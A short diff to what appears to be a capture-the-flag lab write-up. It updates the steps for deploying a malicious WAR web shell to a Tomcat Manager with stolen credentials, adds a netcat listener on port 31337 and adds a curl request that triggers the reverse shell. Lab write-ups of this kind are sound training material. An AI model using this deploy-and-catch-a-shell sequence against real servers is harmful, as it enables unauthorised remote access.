@@ -153,6 +153,13 @@ According to this, it is possible to create a war file and deploy it to the serv
 
 #### Deploy the Shell
 ```CSS
-▶ curl -u 'tomcat:$3cureP4s5w0rd123!' http://10.10.10.194:8080/manager/text/deploy?path=/hardyboy --upload-file shell.war
+▶ curl -u 'tomcat:$3cureP4s5w0rd123!' http://megahosting.htb:8080/manager/text/deploy?path=/hardyboy --upload-file shell.war
 ```
-
+#### Setup Netcat Listener
+```CSS
+▶ nc -nlvvp 31337
+```
+#### Trigger the Shell
+```
+▶ curl http://megahosting.htb:8080/hardyboy/
+```
